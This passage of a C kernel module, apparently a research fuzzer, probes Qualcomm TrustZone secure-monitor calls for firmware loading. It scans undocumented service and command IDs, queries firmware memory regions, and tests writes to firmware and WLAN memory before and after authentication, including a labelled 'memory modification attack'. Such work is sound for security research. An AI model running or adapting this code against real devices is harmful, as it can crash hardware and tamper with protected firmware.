            pr_info("scm_fuzz5: EXT_ARGS test3 ret=%d\n", ret);
            pr_info("  ret[0]=0x%llx ret[1]=0x%llx ret[2]=0x%llx\n",
                    desc.ret[0], desc.ret[1], desc.ret[2]);
            for (j = 0; j < 8; j++)
                pr_info("  __pad[%d]=0x%llx%s\n", j, desc.__pad[j],
                        (j == 3 && desc.__pad[j] != ext_phys) ? " <<MODIFIED" :
                        (j > 3 && desc.__pad[j] != 0xDDDDDDDDDDDDDDDDULL) ? " <<MODIFIED" : "");
            {
                u64 *ep = (u64 *)ext_buf;
                pr_info("scm_fuzz5: EXT_ARGS ext_buf[0..3] = 0x%llx 0x%llx 0x%llx 0x%llx\n",
                        ep[0], ep[1], ep[2], ep[3]);
            }

            do_pas_shutdown(pid_val);
            free_pages((unsigned long)ext_buf, 0);
            kfree(buf);
            break;
        }

        /* sub_test=9: Dump the cleanup function at desc+112 path.
         * When argcount >= 5, __scm_call2 calls a function with desc+0x70.
         * Need to find what that function does. */
        if (sub_test == 9) {
            /* BL is at binary offset 0x338 from scm_call2 (NOT __scm_call2).
             * The instruction there is 0x940003ec → bl +0xFB0
             * Target = scm_call2 + 0x338 + 0xFB0 = scm_call2 + 0x12E8
             */
            unsigned char *base = (unsigned char *)scm_call2;
            u32 *bl_insn = (u32 *)(base + 0x338);
            s32 imm26;
            void *target;
            int j;

            pr_info("scm_fuzz5: CLEANUP_FN scm_call2=%px\n", base);
            pr_info("scm_fuzz5: CLEANUP_FN bl_insn at %px = 0x%08x\n",
                    bl_insn, *bl_insn);

            /* Decode BL: imm26 is bits [25:0], sign-extended, *4 */
            imm26 = (*bl_insn) & 0x03FFFFFF;
            if (imm26 & (1 << 25))
                imm26 |= 0xFC000000; /* sign extend */
            target = (void *)((unsigned long)bl_insn + (imm26 * 4));

            pr_info("scm_fuzz5: CLEANUP_FN target=%px (imm26=0x%x, offset=%d)\n",
                    target, imm26 & 0x03FFFFFF, imm26 * 4);

            /* Dump first 256 bytes of cleanup function */
            for (j = 0; j < 256; j += 16)
                pr_info("scm_fuzz5: CLEANUP %04x: %*ph\n",
                        j, 16, (unsigned char *)target + j);

            kfree(buf);
            break;
        }

        /* sub_test=10: Extended args - baseline init + auth scan
         * Uses do_pas_init_image_nc for proper DMA buffer */
        if (sub_test == 10) {
            void *meta_buf;
            size_t meta_size;

            meta_buf = read_file_buf("/tmp/fw_meta.bin", &meta_size);
            if (!meta_buf) {
                pr_err("scm_fuzz5: EXTPAS cannot read /tmp/fw_meta.bin\n");
                kfree(buf);
                break;
            }
            pr_info("scm_fuzz5: EXTPAS loaded venus.mdt %zu bytes\n", meta_size);

            /* Baseline: init_image with real mdt */
            do_pas_shutdown(pid_val);
            msleep(100);
            ret = do_pas_init_image(pid_val, meta_buf, meta_size);
            pr_info("scm_fuzz5: EXTPAS baseline init ret=%d\n", ret);

            if (ret == 0) {
                /* Normal auth baseline */
                struct scm_desc desc;
                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_1(SCM_VAL);
                desc.args[0] = 9;
                ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_AUTH_AND_RESET_CMD), &desc);
                pr_info("scm_fuzz5: EXTPAS auth baseline ret=%d r0=0x%llx\n",
                        ret, desc.ret[0]);
                do_pas_shutdown(pid_val);
            }
            kfree(meta_buf);
            kfree(buf);
            break;
        }

        /* sub_test=11: auth_and_reset with argcount 2..4 */
        if (sub_test == 11) {
            void *meta_buf;
            size_t meta_size;
            struct scm_desc desc;
            int t;

            meta_buf = read_file_buf("/tmp/fw_meta.bin", &meta_size);
            if (!meta_buf) { kfree(buf); break; }

            static const struct {
                int nargs;
                u64 a1, a2, a3;
                const char *label;
            } auth_tests[] = {
                {2, 0, 0, 0, "a1=0"},
                {2, 1, 0, 0, "a1=1"},
                {3, 0, 0, 0, "a1=0,a2=0"},
                {3, 1, 1, 0, "a1=1,a2=1"},
                {4, 0, 0, 0, "a1-a3=0"},
                {4, 1, 1, 1, "a1-a3=1"},
            };
            for (t = 0; t < ARRAY_SIZE(auth_tests); t++) {
                do_pas_shutdown(pid_val);
                msleep(50);
                ret = do_pas_init_image(pid_val, meta_buf, meta_size);
                if (ret != 0) {
                    pr_info("scm_fuzz5: EXTPAS auth[%d] init failed=%d\n", t, ret);
                    continue;
                }

                memset(&desc, 0, sizeof(desc));
                desc.arginfo = auth_tests[t].nargs;
                desc.args[0] = 9;
                desc.args[1] = auth_tests[t].a1;
                desc.args[2] = auth_tests[t].a2;
                desc.args[3] = auth_tests[t].a3;
                ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_AUTH_AND_RESET_CMD), &desc);
                pr_info("scm_fuzz5: EXTPAS auth %s ret=%d r0=0x%llx\n",
                        auth_tests[t].label, ret, desc.ret[0]);
                do_pas_shutdown(pid_val);
            }
            kfree(meta_buf);
            kfree(buf);
            break;
        }

        /* sub_test=12: mem_setup with 4th arg as flags */
        if (sub_test == 12) {
            void *meta_buf;
            size_t meta_size;
            struct scm_desc desc;
            int t;

            meta_buf = read_file_buf("/tmp/fw_meta.bin", &meta_size);
            if (!meta_buf) { kfree(buf); break; }

            do_pas_shutdown(pid_val);
            msleep(50);
            ret = do_pas_init_image(pid_val, meta_buf, meta_size);
            pr_info("scm_fuzz5: EXTPAS mem_test init ret=%d\n", ret);

            if (ret == 0) {
                static const struct {
                    u64 addr, size;
                    int nargs;
                    u64 a3;
                    const char *label;
                } mem_tests[] = {
                    {0x86a00000, 0x500000, 3, 0, "3arg normal"},
                    {0x86a00000, 0x500000, 4, 0, "4arg flag=0"},
                    {0x86a00000, 0x500000, 4, 1, "4arg flag=1"},
                    {0x86a00000, 0x500000, 4, 0xFF, "4arg flag=FF"},
                    {0x86a00000, 0xFFFFFFFF, 3, 0, "3arg huge_size"},
                    {0, 0x500000, 3, 0, "3arg addr=0"},
                    {0x86a00000, 0, 3, 0, "3arg size=0"},
                };
                for (t = 0; t < ARRAY_SIZE(mem_tests); t++) {
                    memset(&desc, 0, sizeof(desc));
                    desc.arginfo = mem_tests[t].nargs;
                    desc.args[0] = 9;
                    desc.args[1] = mem_tests[t].addr;
                    desc.args[2] = mem_tests[t].size;
                    desc.args[3] = mem_tests[t].a3;
                    ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_MEM_SETUP_CMD), &desc);
                    pr_info("scm_fuzz5: EXTPAS mem %s ret=%d r0=0x%llx\n",
                            mem_tests[t].label, ret, desc.ret[0]);
                }
            }
            do_pas_shutdown(pid_val);
            kfree(meta_buf);
            kfree(buf);
            break;
        }

        /* sub_test=13: Undocumented PAS command scan 0x00-0x1F */
        if (sub_test == 13) {
            struct scm_desc desc;
            int t;

            for (t = 0; t <= 0x1F; t++) {
                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_1(SCM_VAL);
                desc.args[0] = 9;
                ret = scm_call2(SCM_SIP_FNID(PAS_SVC, t), &desc);
                if (ret != -95)
                    pr_info("scm_fuzz5: EXTPAS pas_cmd 0x%02x ret=%d "
                            "r0=0x%llx r1=0x%llx r2=0x%llx\n",
                            t, ret, desc.ret[0], desc.ret[1], desc.ret[2]);
                else
                    pr_info("scm_fuzz5: EXTPAS pas_cmd 0x%02x UNSUPPORTED\n", t);
            }
            kfree(buf);
            break;
        }

        /* sub_test=14: SVC scan - single SVC/cmd at a time
         * Use svc_val= and cmd_val= to specify target
         * If cmd_val<0, scan cmd 0x00-0x10
         * If cmd_val>=0, test only that single cmd */
        if (sub_test == 14) {
            struct scm_desc desc;
            int c, c_start, c_end;
            int svc = svc_val ? svc_val : 0x01;
            kfree(buf);

            if (cmd_val >= 0) {
                c_start = cmd_val;
                c_end = cmd_val;
            } else {
                c_start = 0;
                c_end = 0x10;
            }

            for (c = c_start; c <= c_end; c++) {
                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_1(SCM_VAL);
                desc.args[0] = 0;
                ret = scm_call2(SCM_SIP_FNID(svc, c), &desc);
                pr_info("scm_fuzz5: EXTPAS svc 0x%02x cmd 0x%02x "
                        "ret=%d r0=0x%llx r1=0x%llx r2=0x%llx\n",
                        svc, c, ret, desc.ret[0], desc.ret[1], desc.ret[2]);
            }
            pr_info("scm_fuzz5: EXTPAS svc_scan done\n");
            break;
        }

        /* sub_test=15: Safe full SVC survey - all non-crash SVCs+cmds
         * Logs EVERY response including -22/-95 for documentation */
        if (sub_test == 15) {
            struct scm_desc desc;
            int s, c;
            /* Skip crash points: svc=1/cmd=8, svc=1/cmd=0xd, svc=0x10/cmd=3 */
            static const int svcs[] = {0x01, 0x03, 0x04, 0x05, 0x06, 0x07,
                                        0x0A, 0x0B, 0x0C, 0x0D, 0x10};
            kfree(buf);

            for (s = 0; s < ARRAY_SIZE(svcs); s++) {
                for (c = 0; c <= 0x10; c++) {
                    /* Skip known crash points */
                    if (svcs[s] == 0x01 && (c == 0x08 || c == 0x0d))
                        continue;
                    if (svcs[s] == 0x10 && c == 0x03)
                        continue;

                    memset(&desc, 0, sizeof(desc));
                    desc.arginfo = SCM_ARGS_1(SCM_VAL);
                    desc.args[0] = 0;
                    ret = scm_call2(SCM_SIP_FNID(svcs[s], c), &desc);
                    if (ret != -95)
                        pr_info("scm_fuzz5: SVCSCAN svc=0x%02x cmd=0x%02x "
                                "ret=%d r0=0x%llx r1=0x%llx\n",
                                svcs[s], c, ret, desc.ret[0], desc.ret[1]);
                }
            }
            pr_info("scm_fuzz5: SVCSCAN complete\n");
            break;
        }

        /* sub_test=16: PAS region queries (cmd 0x09/0x0e) with all PIDs
         * Discover memory regions for all subsystems */
        if (sub_test == 16) {
            struct scm_desc desc;
            int pid;
            /* Known PIL PID names (Qualcomm):
             * 0=MBA, 1=modem, 2=ADSP, 3=slpi, 4=CDSP, 5=??,
             * 6=??, 7=NPU, 8=??, 9=venus, 10=wlan, ... */
            kfree(buf);

            pr_info("scm_fuzz5: REGIONQ === PAS cmd 0x09 (region query) ===\n");
            for (pid = 0; pid < 32; pid++) {
                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_1(SCM_VAL);
                desc.args[0] = pid;
                ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x09), &desc);
                if (ret == 0 && (desc.ret[0] || desc.ret[1]))
                    pr_info("scm_fuzz5: REGIONQ pid=%d cmd9 "
                            "r0=0x%llx r1=0x%llx r2=0x%llx\n",
                            pid, desc.ret[0], desc.ret[1], desc.ret[2]);
            }

            pr_info("scm_fuzz5: REGIONQ === PAS cmd 0x0e (region2 query) ===\n");
            for (pid = 0; pid < 32; pid++) {
                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_1(SCM_VAL);
                desc.args[0] = pid;
                ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x0e), &desc);
                if (ret == 0 && (desc.ret[0] || desc.ret[1]))
                    pr_info("scm_fuzz5: REGIONQ pid=%d cmd0e "
                            "r0=0x%llx r1=0x%llx r2=0x%llx\n",
                            pid, desc.ret[0], desc.ret[1], desc.ret[2]);
            }

            pr_info("scm_fuzz5: REGIONQ === PAS cmd 0x07 (is_supported) ===\n");
            for (pid = 0; pid < 32; pid++) {
                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_1(SCM_VAL);
                desc.args[0] = pid;
                ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x07), &desc);
                if (ret == 0)
                    pr_info("scm_fuzz5: REGIONQ pid=%d supported r0=%lld\n",
                            pid, desc.ret[0]);
            }
            pr_info("scm_fuzz5: REGIONQ done\n");
            break;
        }

        /* sub_test=17: Full PAS cycle + memory probe
         * init→mem_setup→probe memory→auth→check
         * Tests if firmware memory is accessible between mem_setup and auth */
        if (sub_test == 17) {
            void *meta_buf;
            size_t meta_size;
            struct scm_desc desc;
            void __iomem *fw_mem;

            meta_buf = read_file_buf("/tmp/fw_meta.bin", &meta_size);
            if (!meta_buf) { kfree(buf); break; }

            /* Step 1: shutdown + init */
            do_pas_shutdown(pid_val);
            msleep(100);
            ret = do_pas_init_image(pid_val, meta_buf, meta_size);
            pr_info("scm_fuzz5: FULLCYC init ret=%d\n", ret);
            if (ret != 0) { kfree(meta_buf); kfree(buf); break; }

            /* Step 2: mem_setup */
            memset(&desc, 0, sizeof(desc));
            desc.arginfo = SCM_ARGS_3(SCM_VAL, SCM_VAL, SCM_VAL);
            desc.args[0] = 9;
            desc.args[1] = 0x86a00000ULL;
            desc.args[2] = 0x500000ULL;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_MEM_SETUP_CMD), &desc);
            pr_info("scm_fuzz5: FULLCYC mem_setup ret=%d\n", ret);

            /* Step 3: Probe firmware memory BEFORE auth
             * ioremap the firmware carveout and read first bytes */
            fw_mem = ioremap(0x86a00000, 0x1000);
            if (fw_mem) {
                u32 w0, w1, w2, w3;
                w0 = readl(fw_mem + 0);
                w1 = readl(fw_mem + 4);
                w2 = readl(fw_mem + 8);
                w3 = readl(fw_mem + 12);
                pr_info("scm_fuzz5: FULLCYC pre-auth fw_mem: "
                        "%08x %08x %08x %08x\n", w0, w1, w2, w3);

                /* Try writing a test pattern */
                writel(0xDEADBEEF, fw_mem);
                wmb();
                w0 = readl(fw_mem);
                pr_info("scm_fuzz5: FULLCYC pre-auth write test: "
                        "wrote 0xDEADBEEF, read back 0x%08x\n", w0);

                /* Restore original */
                writel(0, fw_mem);
                wmb();
                iounmap(fw_mem);
            } else {
                pr_info("scm_fuzz5: FULLCYC ioremap failed\n");
            }

            /* Step 4: auth_and_reset */
            memset(&desc, 0, sizeof(desc));
            desc.arginfo = SCM_ARGS_1(SCM_VAL);
            desc.args[0] = 9;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_AUTH_AND_RESET_CMD), &desc);
            pr_info("scm_fuzz5: FULLCYC auth ret=%d r0=0x%llx\n",
                    ret, desc.ret[0]);

            /* Step 5: Probe memory AFTER auth (XPU should be locked) */
            fw_mem = ioremap(0x86a00000, 0x1000);
            if (fw_mem) {
                u32 w0;
                w0 = readl(fw_mem + 0);
                pr_info("scm_fuzz5: FULLCYC post-auth read: 0x%08x\n", w0);
                iounmap(fw_mem);
            }

            do_pas_shutdown(pid_val);
            kfree(meta_buf);
            kfree(buf);
            break;
        }

        /* sub_test=18: Full PAS cycle with IPA firmware (PID=15)
         * Uses complete firmware with actual segments to achieve auth SUCCESS
         * Then tests memory modification attack */
        if (sub_test == 18) {
            void *meta_buf, *seg_buf;
            size_t meta_size, seg_size;
            struct scm_desc desc;
            void __iomem *fw_mem;
            u32 pid = pid_val ? pid_val : 15; /* IPA FWS default */
            const char *fw_base = meta_path ? meta_path :
                "/var/lib/lxc/android/rootfs/vendor/firmware/lagoon_ipa_fws";
            char path[256];
            int seg;

            /* Load MDT */
            snprintf(path, sizeof(path), "%s.mdt", fw_base);
            meta_buf = read_file_buf(path, &meta_size);
            if (!meta_buf) {
                pr_err("scm_fuzz5: FWCYC cannot read %s\n", path);
                kfree(buf);
                break;
            }
            pr_info("scm_fuzz5: FWCYC pid=%d loaded mdt %zu bytes from %s\n",
                    pid, meta_size, path);

            /* Parse ELF headers */
            {
                Elf32_Ehdr_t *ehdr = (Elf32_Ehdr_t *)meta_buf;
                Elf32_Phdr_t *phdr;
                int i;
                pr_info("scm_fuzz5: FWCYC e_phnum=%d e_phoff=0x%x\n",
                        ehdr->e_phnum, ehdr->e_phoff);
                phdr = (Elf32_Phdr_t *)(meta_buf + ehdr->e_phoff);
                for (i = 0; i < ehdr->e_phnum && i < 16; i++) {
                    pr_info("scm_fuzz5: FWCYC phdr[%d] type=%d "
                            "off=0x%x vaddr=0x%x paddr=0x%x "
                            "filesz=0x%x memsz=0x%x flags=0x%x\n",
                            i, phdr[i].p_type, phdr[i].p_offset,
                            phdr[i].p_vaddr, phdr[i].p_paddr,
                            phdr[i].p_filesz, phdr[i].p_memsz,
                            phdr[i].p_flags);
                }
            }

            /* Step 1: shutdown + init */
            do_pas_shutdown(pid);
            msleep(100);
            ret = do_pas_init_image(pid, meta_buf, meta_size);
            pr_info("scm_fuzz5: FWCYC init ret=%d\n", ret);
            if (ret != 0) {
                /* Try with a620_zap as fallback */
                pr_info("scm_fuzz5: FWCYC init failed, trying a620_zap pid=13\n");
                pid = 13;
                do_pas_shutdown(pid);
                msleep(100);
                kfree(meta_buf);
                meta_buf = read_file_buf(
                    "/var/lib/lxc/android/rootfs/vendor/firmware/a620_zap.mdt",
                    &meta_size);
                if (meta_buf) {
                    ret = do_pas_init_image(pid, meta_buf, meta_size);
                    pr_info("scm_fuzz5: FWCYC gpu init ret=%d\n", ret);
                }
            }
            if (ret != 0) { kfree(meta_buf); kfree(buf); break; }

            /* Step 2: mem_setup */
            memset(&desc, 0, sizeof(desc));
            desc.arginfo = SCM_ARGS_3(SCM_VAL, SCM_VAL, SCM_VAL);
            desc.args[0] = pid;
            desc.args[1] = 0x86a00000ULL;
            desc.args[2] = 0x100000ULL;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_MEM_SETUP_CMD), &desc);
            pr_info("scm_fuzz5: FWCYC mem_setup ret=%d\n", ret);

            /* Step 3: Load segments into memory */
            fw_mem = ioremap(0x86a00000, 0x100000);
            if (fw_mem) {
                Elf32_Ehdr_t *ehdr = (Elf32_Ehdr_t *)meta_buf;
                Elf32_Phdr_t *phdr = (Elf32_Phdr_t *)(meta_buf + ehdr->e_phoff);
                u32 base_paddr = 0;
                int i, loaded = 0;

                /* Find lowest paddr as base */
                for (i = 0; i < ehdr->e_phnum; i++) {
                    if (phdr[i].p_type == 1 && phdr[i].p_filesz > 0) {
                        if (base_paddr == 0 || phdr[i].p_paddr < base_paddr)
                            base_paddr = phdr[i].p_paddr;
                    }
                }
                pr_info("scm_fuzz5: FWCYC base_paddr=0x%x\n", base_paddr);

                /* Clear region */
                memset_io(fw_mem, 0, 0x100000);

                /* Load each segment file */
                for (seg = 0; seg < 16; seg++) {
                    snprintf(path, sizeof(path), "%s.b%02d",
                             (pid == 13) ?
                                "/var/lib/lxc/android/rootfs/vendor/firmware/a620_zap"
                                : "/var/lib/lxc/android/rootfs/vendor/firmware/lagoon_ipa_fws",
                             seg);
                    seg_buf = read_file_buf(path, &seg_size);
                    if (!seg_buf) continue;

                    /* Map segment to correct phdr based on matching index
                     * In split format: .bNN corresponds to phdr[NN] */
                    if (seg < ehdr->e_phnum) {
                        u32 offset;
                        if (phdr[seg].p_paddr >= base_paddr) {
                            offset = phdr[seg].p_paddr - base_paddr;
                        } else {
                            offset = 0;
                        }
                        if (offset < 0x100000 &&
                            offset + seg_size <= 0x100000) {
                            memcpy_toio(fw_mem + offset, seg_buf, seg_size);
                            loaded++;
                            pr_info("scm_fuzz5: FWCYC wrote seg%d "
                                    "%zu bytes at offset 0x%x "
                                    "(paddr=0x%x)\n",
                                    seg, seg_size, offset,
                                    phdr[seg].p_paddr);
                        }
                    }
                    kfree(seg_buf);
                }
                pr_info("scm_fuzz5: FWCYC loaded %d segments\n", loaded);

                /* Verify */
                {
                    u32 w0 = readl(fw_mem);
                    u32 w1 = readl(fw_mem + 4);
                    pr_info("scm_fuzz5: FWCYC data[0]: %08x %08x\n", w0, w1);
                }
                iounmap(fw_mem);
            }

            /* Step 4: auth_and_reset */
            memset(&desc, 0, sizeof(desc));
            desc.arginfo = SCM_ARGS_1(SCM_VAL);
            desc.args[0] = pid;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_AUTH_AND_RESET_CMD), &desc);
            pr_info("scm_fuzz5: FWCYC auth ret=%d r0=0x%llx\n",
                    ret, desc.ret[0]);

            /* Step 5: Check post-auth memory */
            if (ret == 0) {
                fw_mem = ioremap(0x86a00000, 0x1000);
                if (fw_mem) {
                    u32 w0 = readl(fw_mem);
                    pr_info("scm_fuzz5: FWCYC post-auth read: 0x%08x\n", w0);
                    iounmap(fw_mem);
                }
            }

            do_pas_shutdown(pid);
            kfree(meta_buf);
            kfree(buf);
            break;
        }

        /* sub_test=19: Probe PAS cmd 0x08 (undocumented)
         * Test with different PIDs, args, and PAS states */
        if (sub_test == 19) {
            struct scm_desc desc;
            void *meta_buf;
            size_t meta_size;
            int pid;

            kfree(buf);

            /* Test cmd 0x08 with each supported PID */
            pr_info("scm_fuzz5: CMD8 === Cold state ===\n");
            for (pid = 0; pid < 24; pid++) {
                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_1(SCM_VAL);
                desc.args[0] = pid;
                ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x08), &desc);
                if (ret != -95)
                    pr_info("scm_fuzz5: CMD8 pid=%d ret=%d "
                            "r0=0x%llx r1=0x%llx r2=0x%llx\n",
                            pid, ret, desc.ret[0], desc.ret[1], desc.ret[2]);
            }

            /* Test after init_image */
            meta_buf = read_file_buf("/tmp/fw_meta.bin", &meta_size);
            if (meta_buf) {
                do_pas_shutdown(pid_val);
                msleep(50);
                do_pas_init_image(pid_val, meta_buf, meta_size);

                pr_info("scm_fuzz5: CMD8 === After init_image ===\n");
                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_1(SCM_VAL);
                desc.args[0] = 9;
                ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x08), &desc);
                pr_info("scm_fuzz5: CMD8 pid=9 post-init ret=%d "
                        "r0=0x%llx r1=0x%llx r2=0x%llx\n",
                        ret, desc.ret[0], desc.ret[1], desc.ret[2]);

                /* Test with 2 args */
                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_2(SCM_VAL, SCM_VAL);
                desc.args[0] = 9;
                desc.args[1] = 1;
                ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x08), &desc);
                pr_info("scm_fuzz5: CMD8 pid=9 2args(1) ret=%d "
                        "r0=0x%llx\n", ret, desc.ret[0]);

                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_2(SCM_VAL, SCM_VAL);
                desc.args[0] = 9;
                desc.args[1] = 0;
                ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x08), &desc);
                pr_info("scm_fuzz5: CMD8 pid=9 2args(0) ret=%d "
                        "r0=0x%llx\n", ret, desc.ret[0]);

                /* Test PAS 0x0f too */
                memset(&desc, 0, sizeof(desc));
                desc.arginfo = SCM_ARGS_1(SCM_VAL);
                desc.args[0] = 9;
                ret = scm_call2(SCM_SIP_FNID(PAS_SVC, 0x0f), &desc);
                pr_info("scm_fuzz5: CMD0F pid=9 ret=%d "
                        "r0=0x%llx r1=0x%llx\n",
                        ret, desc.ret[0], desc.ret[1]);

                do_pas_shutdown(pid_val);
                kfree(meta_buf);
            }
            break;
        }

        /* sub_test=20: WLAN firmware memory probe
         * Direct ioremap of wlan_fw_region@8b500000 (2MB)
         * Check if we can read/write WLAN firmware in memory */
        if (sub_test == 20) {
            void __iomem *wlan_mem;
            u32 words[16];
            int i;

            kfree(buf);

            pr_info("scm_fuzz5: WLANMEM === Probing 0x8b500000 (2MB) ===\n");
            wlan_mem = ioremap(0x8b500000, 0x200000);
            if (!wlan_mem) {
                pr_err("scm_fuzz5: WLANMEM ioremap failed!\n");
                break;
            }

            /* Read first 64 bytes */
            for (i = 0; i < 16; i++)
                words[i] = readl(wlan_mem + i * 4);
            pr_info("scm_fuzz5: WLANMEM [0x000] "
                    "%08x %08x %08x %08x %08x %08x %08x %08x\n",
                    words[0], words[1], words[2], words[3],
                    words[4], words[5], words[6], words[7]);
            pr_info("scm_fuzz5: WLANMEM [0x020] "
                    "%08x %08x %08x %08x %08x %08x %08x %08x\n",
                    words[8], words[9], words[10], words[11],
                    words[12], words[13], words[14], words[15]);

            /* Read at various offsets to see firmware structure */
            for (i = 0; i < 8; i++) {
                u32 off = i * 0x40000; /* every 256KB */
                if (off < 0x200000) {
                    u32 w0 = readl(wlan_mem + off);
                    u32 w1 = readl(wlan_mem + off + 4);
                    u32 w2 = readl(wlan_mem + off + 8);
                    u32 w3 = readl(wlan_mem + off + 12);
                    pr_info("scm_fuzz5: WLANMEM [0x%06x] "
                            "%08x %08x %08x %08x\n",
                            off, w0, w1, w2, w3);
                }
            }

            /* Try write test: save original, write pattern, verify, restore */
            {
                u32 orig = readl(wlan_mem);
                pr_info("scm_fuzz5: WLANMEM write test: orig=0x%08x\n", orig);

                writel(0xCAFEBABE, wlan_mem);
                wmb();
                {
                    u32 readback = readl(wlan_mem);
                    pr_info("scm_fuzz5: WLANMEM write test: "
                            "wrote=0xCAFEBABE read=0x%08x %s\n",
                            readback,
                            readback == 0xCAFEBABE ?
                                "WRITABLE!" : "BLOCKED/XPU");
                }

                /* Restore original */
                writel(orig, wlan_mem);
                wmb();
            }

            /* Try writing at offset (maybe start is protected) */
            {
                u32 off = 0x100;
                u32 orig = readl(wlan_mem + off);
                writel(0xDEAD1234, wlan_mem + off);
                wmb();
                {
                    u32 readback = readl(wlan_mem + off);
                    pr_info("scm_fuzz5: WLANMEM write@0x%x: "
                            "orig=0x%08x wrote=0xDEAD1234 read=0x%08x\n",
                            off, orig, readback);
                }
                writel(orig, wlan_mem + off);
                wmb();
            }

            iounmap(wlan_mem);
            pr_info("scm_fuzz5: WLANMEM done\n");
            break;
        }

        kfree(buf);
    }
    break;

    default:
        pr_err("scm_fuzz5: invalid op %d\n", op);
        return -EINVAL;
    }

    pr_info("scm_fuzz5: === DONE ===\n");
    return 0;
}

static void __exit scm_fuzz5_exit(void)
{
    pr_info("scm_fuzz5: unloaded\n");
}

module_init(scm_fuzz5_init);
module_exit(scm_fuzz5_exit);
